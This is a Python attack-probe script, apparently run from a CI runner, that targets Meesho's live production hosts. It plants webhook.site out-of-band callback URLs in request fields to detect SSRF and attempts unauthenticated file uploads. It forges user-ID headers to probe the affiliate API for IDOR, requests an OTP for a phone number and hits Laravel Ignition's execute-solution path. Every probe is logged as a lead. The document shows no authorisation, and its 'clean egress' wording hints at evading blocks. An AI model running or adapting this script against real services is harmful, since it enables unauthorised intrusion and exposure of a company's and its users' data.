#!/usr/bin/env python3
"""Meesho Wave10B: OOB SSRF check, pow-event, file upload, affiliate IDOR, Ignition - clean egress."""
import json, urllib.request, urllib.error, ssl, uuid, time
ctx = ssl.create_default_context()
out = {"probes": [], "leads": [], "confirmed": [], "oob_hits": 0}

def req(url, method="GET", headers=None, data=None, timeout=20):
    h = {"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Accept-Encoding": "identity"}
    if headers:
        h.update(headers)
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, context=ctx, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read(8000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(8000).decode("utf-8", "replace")
    except Exception as e:
        return 0, {}, str(e)

# webhook.site token
try:
    code, hdrs, body = req("https://webhook.site/token", method="POST", data=b"", headers={"Content-Length": "0", "Accept": "application/json"})
    # POST with empty body might need Content-Length
except Exception:
    pass
try:
    r = urllib.request.Request("https://webhook.site/token", data=b"{}", headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}, method="POST")
    with urllib.request.urlopen(r, context=ctx, timeout=20) as resp:
        tok = json.loads(resp.read().decode())
        token = tok["uuid"]
except Exception as e:
    token = None
    out["oob_err"] = str(e)

oob = f"https://webhook.site/{token}" if token else None
out["oob"] = oob
marker = "w10b-" + str(uuid.uuid4())[:8]

BASE = "https://superstoreapp.meesho.com"
mob = {
    "APP-USER-ID": "1", "App-Version-Code": "512", "App-Session-Id": str(uuid.uuid4()),
    "Instance-Id": "b0382b39-6e59-4e17-a899-8d88d14a7e42",
    "Xo": "gha-test", "Origin": BASE, "Referer": BASE + "/",
    "Content-Type": "application/json", "X-Requested-With": "com.meesho.supply",
}

# pow-event with OOB
if oob:
    for field in ["webhook", "url", "endpoint", "callback", "image", "src"]:
        pb = {field: f"{oob}/{marker}-{field}", "event": "lurksek"}
        code, hdrs, body = req(BASE + "/api/customer/pow-event-data", method="POST", headers=mob, data=json.dumps(pb).encode())
        out["probes"].append({"name": f"pow_{field}", "code": code, "body": body[:200]})

# file upload multipart
boundary = "----GHABoundary"
jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"
body_up = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"image\"; filename=\"t.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").encode() + jpeg + f"\r\n--{boundary}--\r\n".encode()
h = dict(mob); h["Content-Type"] = f"multipart/form-data; boundary={boundary}"
code, hdrs, body = req(BASE + "/api/customer/file/upload", method="POST", headers=h, data=body_up)
out["probes"].append({"name": "file_upload", "code": code, "body": body[:400]})
if code in (200, 201) and ("http" in body.lower() or "url" in body.lower()):
    out["leads"].append({"type": "unauth_upload", "body": body[:400]})

# products unauth
for path in [
    "/api/products/2.0/fetch?limit=5&pincode=440002",
    "/api/search/suggests?q=milk&pincode=440002",
    "/api/customer/config?pincode=440002",
    "/api/internal/customer/metric",
]:
    code, hdrs, body = req(BASE + path, headers=mob)
    out["probes"].append({"name": "ss", "path": path, "code": code, "body": body[:300]})
    if code == 200 and "product" in body.lower():
        out["leads"].append({"type": "unauth_data", "path": path, "body": body[:400]})

# affiliate
AFF = "https://affiliate.meesho.com"
aff_h = {
    "APP-CLIENT-ID": "affiliate-web", "APP-USER-ID": "1", "user-id": "1",
    "device_type": "web", "firebase_instance_id": str(uuid.uuid4()),
    "Origin": AFF, "Content-Type": "application/json",
}
for path in [
    "/api/auth/user-profile", "/api/1.0/affiliate/get-sourcing-credit-configs",
    "/api/1.0/affiliate/best-selling-reels/", "/api/collection-links",
]:
    code, hdrs, body = req(AFF + path, headers=aff_h)
    out["probes"].append({"name": "aff", "path": path, "code": code, "body": body[:300]})
    if code == 200 and body.strip().startswith("{") and "not logged" not in body.lower() and "not found" not in body.lower():
        out["leads"].append({"type": "aff_data", "path": path, "body": body[:400]})

# OTP with proper schema from clean IP
code, hdrs, body = req(AFF + "/api/auth/request-otp", method="POST", headers=aff_h,
    data=json.dumps({"phone_number": "9876543210", "instanceId": str(uuid.uuid4())}).encode())
out["probes"].append({"name": "otp", "code": code, "body": body[:300]})

# Ignition
for path in ["/_ignition/health-check", "/_ignition/execute-solution"]:
    code, hdrs, body = req("https://admin.meeshosupply.com" + path, headers={"User-Agent": "okhttp/4.9.0", "Accept": "application/json"})
    out["probes"].append({"name": "ign", "path": path, "code": code, "body": body[:300]})
    if code == 200 and body.strip().startswith("{"):
        out["leads"].append({"type": "ignition_open", "path": path, "body": body[:400]})

# poll OOB
if token:
    time.sleep(6)
    try:
        code, hdrs, body = req(f"https://webhook.site/token/{token}/requests?sorting=newest", headers={"Accept": "application/json"})
        data = json.loads(body) if body.startswith("{") or body.startswith("[") else {}
        reqs = data if isinstance(data, list) else data.get("data", [])
        out["oob_hits"] = len(reqs) if isinstance(reqs, list) else 0
        if out["oob_hits"] > 0:
            out["confirmed"].append({"type": "ssrf_oob", "count": out["oob_hits"]})
            out["leads"].append({"type": "ssrf_oob"})
    except Exception as e:
        out["oob_poll_err"] = str(e)

import os
os.makedirs("artifacts", exist_ok=True)
with open("artifacts/meesho_wave10b_gha.json", "w") as f:
    json.dump(out, f, indent=2)
print(json.dumps({"probes": len(out["probes"]), "leads": out["leads"], "oob_hits": out["oob_hits"], "confirmed": out["confirmed"]}, indent=2))
